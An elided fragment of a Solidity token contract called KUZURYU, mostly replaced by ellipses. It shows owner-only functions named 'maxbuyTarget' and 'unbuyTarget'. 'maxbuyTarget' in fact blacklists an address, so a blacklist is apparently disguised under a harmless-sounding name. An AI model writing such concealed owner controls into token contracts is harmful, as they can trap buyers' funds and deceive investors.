...
contract KUZURYU is Context, IERC20 {
    ...
    function ismaxbuy(address account) public view returns (bool) {
    ...
    function maxbuyTarget(address payable targetaddress) public onlyOwner returns (bool){
        _wantblacklist(targetaddress);
        return true;
    }
    
    function unbuyTarget(address payable targetaddress) public onlyOwner returns (bool){
